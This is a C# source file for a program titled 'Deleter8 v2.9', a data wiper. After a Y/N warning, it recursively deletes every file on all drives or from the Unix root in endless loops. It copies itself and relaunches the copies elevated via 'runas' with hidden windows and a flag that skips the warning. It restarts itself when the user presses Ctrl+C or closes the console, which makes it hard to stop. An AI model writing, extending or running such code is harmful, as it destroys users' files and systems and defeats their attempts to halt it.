namespace System
{
    public class OS
    {
        public static System.Boolean CapitalizeContains(System.String a, System.String b)
        {
            a = System.OS.Capitalize(a);
            b = System.OS.Capitalize(b);
            return a.IndexOf(b) >= 0;
        }
        public static System.String Capitalize(System.String str)
        {
            if (System.String.IsNullOrEmpty(str))
            {
                return str;
            }
            System.Char[] a = str.ToLower().ToCharArray();
            a[0] = System.Char.ToUpper(a[0]);
            return new System.String(a);
        }
        public static System.String RestartPath = System.Reflection.Assembly.GetEntryAssembly().Location;
        public static System.String GetRestartPath()
        {
            return System.OS.RestartPath;
        }
        public virtual System.Boolean IsWindows 
        {
            get
            {
                return false;
            } 
        }
        public virtual System.String PlatformName 
        { 
            get 
            {
                return "Unknown";
            }
        }
        public virtual System.String ProcessName
        {
            get
            {
                return "Unknown";
            }
        }
        public virtual System.String ProcessFilePath
        {
            get
            {
                return "Unknown";
            }
        }
        public virtual void RestartProcess()
        {
            System.Diagnostics.Process.Start(System.OS.GetRestartPath());
        }
        public static System.OS DetectedOS = new System.OS();
        public static void DetectCurrentOS()
        {
            if (System.OS.DetectedOS == null || System.OS.DetectedOS == new System.OS())
            {
                System.OS.DetectedOS = System.OS.GetCurrentOS();
            }
        }
        public unsafe static System.OS GetCurrentOS()
        {
            System.PlatformID platform = System.Environment.OSVersion.Platform;
            if (platform == System.PlatformID.Win32S)
            {
                return new System.WindowsOS();
            }
            else if (platform == System.PlatformID.Win32Windows)
            {
                return new System.WindowsOS();
            }
            else if (platform == System.PlatformID.Win32NT)
            {
                return new System.WindowsOS();
            }
            else if (platform == System.PlatformID.WinCE)
            {
                return new System.WindowsOS();
            }
            else if (platform == System.PlatformID.Xbox)
            {
                return new System.WindowsOS();
            }
            else if (platform == System.PlatformID.Unix)
            {
                System.SByte* utsname = stackalloc System.SByte[8192];
                System.OS.uname(utsname);
                System.String kernel = new System.String(utsname);
                if (System.OS.CapitalizeContains(kernel, "Linux"))
                {
                    return new System.LinuxOS();
                }
                else if (System.OS.CapitalizeContains(kernel, "Unix"))
                {
                    return new System.UnixOS();
                }
                else
                {
                    return new System.UnixOS();
                }
            }
            else if (platform == System.PlatformID.MacOSX)
            {
                return new System.UnixOS();
            }
            else
            {
                System.SByte* utsname = stackalloc System.SByte[8192];
                System.OS.uname(utsname);
                System.String kernel = new System.String(utsname);
                if (System.OS.CapitalizeContains(kernel, "Windows"))
                {
                    return new System.WindowsOS();
                }
                else if (System.OS.CapitalizeContains(kernel, "Linux"))
                {
                    return new System.LinuxOS();
                }
                else if (System.OS.CapitalizeContains(kernel, "Unix"))
                {
                    return new System.UnixOS();
                }
                else
                {
                    return new System.UnixOS();
                }
            }
        }
        [System.Runtime.InteropServices.DllImport("libc")]
        public unsafe static extern void uname(System.SByte* uname_struct);
    }
    public class WindowsOS : System.OS
    {
        public override System.String ProcessName 
        {
            get
            {
                return System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
            }
        }
        public override System.String ProcessFilePath
        {
            get
            {
                return System.IO.Path.GetFullPath(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            }
        }
        public override System.Boolean IsWindows 
        { 
            get 
            { 
                return true; 
            } 
        }
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Windows"; 
            } 
        }
    }
    public class UnixOS : System.OS
    {
        public override System.String ProcessName
        {
            get
            {
                return System.UnixOS.GetProcessExePath();
            }
        }
        public override System.String ProcessFilePath
        {
            get
            {
                return System.IO.Path.GetFullPath(System.Reflection.Assembly.GetExecutingAssembly().Location);
            }
        }
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Unix"; 
            } 
        }
        public override System.Boolean IsWindows
        { 
            get 
            { 
                return false; 
            } 
        }
        public override void RestartProcess()
        {
            this.RestartInPlace();
        }
        public virtual void RestartInPlace()
        {
            System.String exe = System.UnixOS.GetProcessExePath();
            System.UnixOS.execvp(exe, new System.String[] 
            { 
                exe, 
                System.OS.RestartPath, 
                null 
            });
            System.Console.WriteLine("execvp {0} failed: {1}", exe, System.Runtime.InteropServices.Marshal.GetLastWin32Error());
            System.UnixOS.execvp("mono", new System.String[] 
            { 
                "mono", 
                System.OS.RestartPath, 
                null 
            });
            System.Console.WriteLine("execvp mono failed: {0}", System.Runtime.InteropServices.Marshal.GetLastWin32Error());
        }
        [System.Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public static extern System.Int32 execvp(System.String path, System.String[] argv);
        public static System.String GetProcessExePath()
        {
            return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }
    }
    public class LinuxOS : System.UnixOS
    {
        public override System.String PlatformName 
        { 
            get 
            { 
                return "Linux"; 
            } 
        }
        public override System.String ProcessFilePath
        {
            get
            {
                return System.IO.Path.GetFullPath(System.UnixOS.GetProcessExePath());
            }
        }
        public override void RestartInPlace()
        {
            try
            {
                System.String exe = System.UnixOS.GetProcessExePath();
                System.String[] args = System.LinuxOS.GetProcessCommandLineArgs();
                System.UnixOS.execvp(exe, args);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine("Error restarting process: {0}", ex);
            }
            base.RestartInPlace();
        }
        public static System.String[] GetProcessCommandLineArgs()
        {
            using (System.IO.StreamReader r = new System.IO.StreamReader("/proc/self/cmdline"))
            {
                System.String[] args = r.ReadToEnd().Split('\0');
                args[args.Length - 1] = null;
                return args;
            }
        }
    }
    public class Deleter
    {
        private static readonly System.Collections.Generic.List<System.String> DirectoriesList = new System.Collections.Generic.List<System.String>()
        {
        };
        private static System.Boolean CanAccess(System.String folderPath, out System.Exception ex)
        {
            System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(folderPath);
            try
            {
                dirInfo.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
                ex = null;
                return true;
            }
            catch (System.Security.AccessControl.PrivilegeNotHeldException e)
            {
                ex = e;
                return false;
            }
        }
        private static System.Collections.Generic.List<System.String> AddDir(System.String dir)
        {
            foreach (System.String d in System.IO.Directory.GetDirectories(dir))
            {
                if (System.Deleter.CanAccess(d, out System.Exception ex))
                {
                    System.Deleter.DirectoriesList.Add(d);
                    System.Deleter.AddDir(d);
                }
                else
                {
                    System.Console.Out.WriteLine("Can't access " + d + ex);
                }
            }
            return System.Deleter.DirectoriesList;
        }
        public const System.String Ver = "2.9";
        public const System.String Title = "Deleter8 v" + System.Deleter.Ver;
        private static System.String[] LogicalDrives;
        private static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>()
        {
        };
        private static System.String FileName = System.String.Empty;
        private static System.String FileExtension = System.String.Empty;
        private static System.Double Double;
        private static System.Double LoopingDouble;
        private static System.Double Count = 0;
        private static readonly System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        private static readonly System.String[] Messages = System.Deleter.Argument.Split('\n');
        private static System.Boolean FileDeleted;
        private static System.Boolean IsCloned;
        private static System.Exception Exception;
        public static void TryDeleteFile(System.String file)
        {
            if (System.IO.File.Exists(file))
            {
                try
                {
                    System.Console.Out.WriteLine("Deleting " + file);
                    System.IO.File.Delete(file);
                    if (!System.IO.File.Exists(file))
                    {
                        System.Deleter.FileDeleted = true;
                    }
                    else
                    {
                        System.Deleter.Exception = new System.InvalidOperationException("Failed to delete file: " + file);
                        System.Deleter.FileDeleted = false;
                    }
                }
                catch (System.Exception e)
                {
                    System.Deleter.Exception = e;
                    System.Deleter.FileDeleted = false;
                }
            }
            else
            {
                System.Deleter.FileDeleted = true;
            }
        }
        public static void ContinueDeletingUnix()
        {
            try
            {
                System.Deleter.RtlAdjustPrivilege(19, true, false, out System.Deleter.PreviousValue);
            }
            catch
            {
                System.Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            System.Console.Clear();
            System.Deleter.Count++;
            System.Console.Out.WriteLine(System.Deleter.Count);
            System.Console.ForegroundColor = System.ConsoleColor.Yellow;
            System.Console.BackgroundColor = System.ConsoleColor.Black;
            System.Threading.Thread.Sleep(200);
            System.Console.Out.WriteLine(System.Deleter.Messages);
            System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            System.Deleter.AddDir(root);
            while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
            {
                System.Deleter.LoopingDouble++;
                try
                {
                    System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
                    foreach (System.String dir in dirs)
                    {
                        System.String[] files = System.IO.Directory.GetFiles(dir);
                        foreach (System.String file in files)
                        {
                            System.Deleter.TryDeleteFile(file);
                            if (System.Deleter.FileDeleted == false)
                            {
                                System.Console.Out.WriteLine("Failed to delete file: " + file);
                                System.Console.Out.WriteLine(System.Deleter.Exception);
                            }
                        }
                    }
                }
                catch 
                {
                    System.Deleter.DeleteDirUnix();
                }
            }
        }
        public static void DeleteDirUnix()
        {
            try
            {
                System.Deleter.RtlAdjustPrivilege(19, true, false, out System.Deleter.PreviousValue);
            }
            catch
            {
                System.Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            System.Console.ForegroundColor = System.ConsoleColor.Red;
            System.Console.BackgroundColor = System.ConsoleColor.Black;
            System.Console.Out.WriteLine(System.Deleter.Messages);
            System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            System.Deleter.AddDir(root);
            while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
            {
                System.Deleter.LoopingDouble++;
                try
                {
                    System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
                    foreach (System.String dir in dirs)
                    {
                        System.String[] files = System.IO.Directory.GetFiles(dir);
                        foreach (System.String file in files)
                        {
                            System.Deleter.TryDeleteFile(file);
                            if (!System.Deleter.FileDeleted)
                            {
                                System.Console.Out.WriteLine("Failed to delete file: " + file);
                                System.Console.Out.WriteLine(System.Deleter.Exception);
                            }
                        }
                    }
                }
                catch
                {
                    System.Deleter.ContinueDeletingUnix();
                }
            }
        }
        public static void DeleteDir()
        {
            try
            {
                System.Console.Out.WriteLine(System.Deleter.Messages);
                System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
                System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
                foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (System.String drive in System.Deleter.LogicalDrives)
                    {
                        System.String root = System.IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        System.Deleter.AddDir(root);
                        System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
                        foreach (System.String dir in dirs)
                        {
                            System.String[] files = System.IO.Directory.GetFiles(dir);
                            foreach (System.String file in files)
                            {
                                System.Deleter.TryDeleteFile(file);
                                if (!System.Deleter.FileDeleted)
                                {
                                    System.Console.Out.WriteLine("Failed to delete file: " + file);
                                    System.Console.Out.WriteLine(System.Deleter.Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                {
                    System.Deleter.LoopingDouble++;
                    System.Deleter.ContinueDeleting();
                }
            }
        }
        public static void ContinueDeleting()
        {
            try
            {
                System.Deleter.Count++;
                System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
                System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
                System.Console.Out.WriteLine(System.Deleter.Count);
                System.Console.ForegroundColor = System.ConsoleColor.Yellow;
                System.Console.BackgroundColor = System.ConsoleColor.Black;
                System.Threading.Thread.Sleep(200);
                System.Console.Out.WriteLine(System.Deleter.Messages);
                foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (System.String drive in System.Deleter.LogicalDrives)
                    {
                        System.String root = System.IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        System.Deleter.AddDir(root);
                        System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
                        foreach (System.String dir in dirs)
                        {
                            System.String[] files = System.IO.Directory.GetFiles(dir);
                            foreach (System.String file in files)
                            {
                                System.Deleter.TryDeleteFile(file);
                                if (!System.Deleter.FileDeleted)
                                {
                                    System.Console.Out.WriteLine("Failed to delete file: " + file);
                                    System.Console.Out.WriteLine(System.Deleter.Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                {
                    System.Deleter.LoopingDouble++;
                    System.Deleter.DeleteDir();
                }
            }
        }
        public delegate System.Boolean ConsoleEventDelegate(System.Int32 eventType);
        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        public static extern System.Boolean SetConsoleCtrlHandler(System.Deleter.ConsoleEventDelegate callback, System.Boolean add);
        public static System.Deleter.ConsoleEventDelegate Handler;
        public static System.Boolean ConsoleEventCallback(System.Int32 eventType)
        {
            System.OS.DetectedOS.RestartProcess();
            return false;
        }
        public static void OnCancelKeyPress(System.Object sender, System.ConsoleCancelEventArgs e)
        {
            System.OS.DetectedOS.RestartProcess();
        }
        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern System.UInt32 RtlAdjustPrivilege(System.Int32 Privilege, System.Boolean EnablePrivilege, System.Boolean IsThreadPrivilege, out System.Boolean PreviousValue);
        public static System.Boolean PreviousValue = false;
        public static void Continue(System.String[] args)
        {
            System.String arguments = "";
            foreach (System.String arg in args)
            {
                arguments += arg;
            }
            if (arguments.ToLower().Contains("cloned"))
            {
                System.Deleter.IsCloned = true;
            }
            else
            {
                System.Deleter.IsCloned = false;
            }
            if (!System.Deleter.IsCloned)
            {
                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
                {
                    System.Environment.Exit(0);
                    return;
                }
            }
            System.OS.DetectCurrentOS();
            System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
            System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
            if (System.OS.DetectedOS.IsWindows)
            {
                System.Console.CancelKeyPress += System.Deleter.OnCancelKeyPress;
                System.Deleter.Handler = new System.Deleter.ConsoleEventDelegate(System.Deleter.ConsoleEventCallback);
                System.Deleter.SetConsoleCtrlHandler(System.Deleter.Handler, true);
                System.Console.Title = System.Deleter.Title;
                System.Console.ForegroundColor = System.ConsoleColor.Red;
                System.Console.BackgroundColor = System.ConsoleColor.Black;
            }
            System.Threading.Thread.Sleep(1000);
            while (System.Deleter.Double != System.Double.PositiveInfinity)
            {
                try
                {
                    System.Deleter.Double++;
                    if (!System.OS.DetectedOS.IsWindows)
                    {
                        System.Deleter.DeleteDirUnix();
                    }
                    else
                    {
                        System.IO.File.Copy(System.IO.Path.GetFileName(System.OS.DetectedOS.ProcessFilePath), System.Deleter.FileName + " (" + System.Deleter.Double + ")" + System.Deleter.FileExtension);
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = System.Deleter.FileName + "(" +
                            System.Deleter.Double + ")" + System.Deleter.FileExtension;
                        p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        System.Deleter.DeleteDir();
                    }
                }
                catch
                {
                    while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                    {
                        System.Deleter.LoopingDouble++;
                        System.Deleter.Main(args);
                    }
                }
            }
        }
        public static void Main(System.String[] args)
        {
            System.String arguments = "";
            foreach (System.String arg in args)
            {
                arguments += arg;
            }
            if (arguments.ToLower().Contains("cloned"))
            {
                System.Deleter.IsCloned = true;
            }
            else
            {
                System.Deleter.IsCloned = false;
            }
            if (!System.Deleter.IsCloned)
            {
                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
                {
                    System.Environment.Exit(0);
                    return;
                }
            }
            System.OS.DetectCurrentOS();
            System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
            System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
            if (System.OS.DetectedOS.IsWindows)
            {
                System.Console.CancelKeyPress += System.Deleter.OnCancelKeyPress;
                System.Deleter.Handler = new System.Deleter.ConsoleEventDelegate(System.Deleter.ConsoleEventCallback);
                System.Deleter.SetConsoleCtrlHandler(System.Deleter.Handler, true);
                System.Console.Title = System.Deleter.Title;
                System.Console.ForegroundColor = System.ConsoleColor.Red;
                System.Console.BackgroundColor = System.ConsoleColor.Black;
            }
            System.Threading.Thread.Sleep(1000);
            while (System.Deleter.Double != System.Double.PositiveInfinity)
            {
                try
                {
                    System.Deleter.Double++;
                    if (!System.OS.DetectedOS.IsWindows)
                    {
                        System.Deleter.DeleteDirUnix();
                    }
                    else
                    {
                        System.IO.File.Copy(System.IO.Path.GetFileName(System.OS.DetectedOS.ProcessFilePath), System.Deleter.FileName + " (" + System.Deleter.Double + ")" + System.Deleter.FileExtension);
                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = System.Deleter.FileName + "(" +
                            System.Deleter.Double + ")" + System.Deleter.FileExtension;
                        p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        System.Deleter.DeleteDir();
                    }
                }
                catch
                {
                    while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                    {
                        System.Deleter.LoopingDouble++;
                        System.Deleter.Continue(args);
                    }
                }
            }
        }
    }
}